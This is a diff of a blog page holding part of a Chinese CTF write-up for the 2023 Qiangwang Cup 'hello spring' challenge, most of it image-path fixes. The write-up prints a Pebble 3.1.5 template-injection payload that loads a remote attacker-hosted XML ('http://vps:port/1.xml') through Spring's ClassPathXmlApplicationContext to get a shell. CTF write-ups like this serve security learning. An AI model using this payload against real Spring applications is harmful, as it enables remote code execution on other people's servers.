+<img src="/img/2023第七届强网杯/170482122317317.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <h2 id="hello-spring">hello spring</h2>
 <p>题目给的jar包和远程不一样</p>
 <p>然后根据配置文件和源码<code>return "home";</code>写一个<code>home.pebble</code>放在<code>/tmp</code>目录下，作为模板文件</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317318.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317318.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317319.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317319.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>本地搭好环境之后是这样的</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317320.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317320.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>pom.xml看到pebble组件版本为3.1.5</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317321.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317321.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>可以搜索到https://github.com/Y4tacker/Web-Security/issues/3?cve=title</p>
@@ -549,22 +549,22 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;% set y= beans.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;</span>).<span class="hljs-property">resourceLoader</span>.<span class="hljs-property">classLoader</span>.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&quot;java.beans.Beans&quot;</span>) %&#125;<br>&#123;% set yy =  beans.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;jacksonObjectMapper&quot;</span>).<span class="hljs-title function_">readValue</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y) %&#125;<br>&#123;% set yyy = yy.<span class="hljs-title function_">instantiate</span>(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>) %&#125;<br>&#123;&#123; yyy.<span class="hljs-title function_">setConfigLocation</span>(<span class="hljs-string">&quot;http://vps:port/1.xml&quot;</span>) &#125;&#125;<br>&#123;&#123; yyy.<span class="hljs-title function_">refresh</span>() &#125;&#125;<br></code></pre></td></tr></table></figure>
 <p>这里注意时间</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317322.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317322.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317323.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317323.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>本地是加了8小时（实际上好像不用加）</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317324.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317324.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>然后访问<code>?x=file_20231227_230625</code>弹shell</p>
 <p>远程还有一个filter但是jar包里没给</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317425.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317425.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>实际黑名单过滤了</p>
@@ -608,7 +608,7 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
     
       <span class="category-chain">
         
-  <a href="/categories/misc/" class="category-chain-item">misc</a>
+  <a href="/categories/web/" class="category-chain-item">web</a>
   
   
 
@@ -618,7 +618,7 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
     
       <span class="category-chain">
         
-  <a href="/categories/web/" class="category-chain-item">web</a>
+  <a href="/categories/misc/" class="category-chain-item">misc</a>
   
   
 
